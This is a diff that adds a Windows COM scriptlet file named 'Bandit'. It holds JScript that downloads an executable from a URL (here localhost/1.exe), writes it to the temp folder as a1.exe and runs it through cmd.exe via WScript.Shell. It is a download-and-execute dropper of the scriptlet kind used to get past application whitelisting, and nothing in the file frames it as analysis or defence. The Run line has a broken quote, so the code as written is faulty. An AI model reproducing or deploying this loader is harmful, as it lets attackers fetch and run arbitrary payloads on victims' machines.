@@ -1,0 +1,72 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+	>
+</registration>
+
+<script language="JScript">
+<![CDATA[
+// + CreateObject("WScript.Shell")
+
+
+
+var url2down = "http://localhost/1.exe"
+
+
+
+
+var FileName = "\\a1.exe"
+
+
+
+
+
+
+
+function downloadToFile(url, file) {
+	
+
+    var xhr = new ActiveXObject("msxml2.xmlhttp"), 
+        ado = new ActiveXObject("ADODB.Stream");
+
+    xhr.open("GET", url, false);
+    xhr.send();
+    if (xhr.status === 200) {
+        ado.type = 1;
+        ado.open();
+        ado.write(xhr.responseBody);
+        ado.saveToFile(file);
+        ado.close();
+    }
+}
+
+
+var FSO, list, i, Folder;
+var FullPath, TxtFile;  
+
+
+	FSO = WScript.CreateObject("Scripting.FileSystemObject");  
+	FullPath = FSO.GetSpecialFolder(2).Path
+	FullPath = FullPath + FileName
+	
+
+
+	downloadToFile(url2down ,FullPath )
+	
+
+
+
+
+	var r = new ActiveXObject("WScript.Shell").Run(cmd.exe /c " + FullPath);
+	
+	
+]]>
+</script>
+
+</scriptlet>
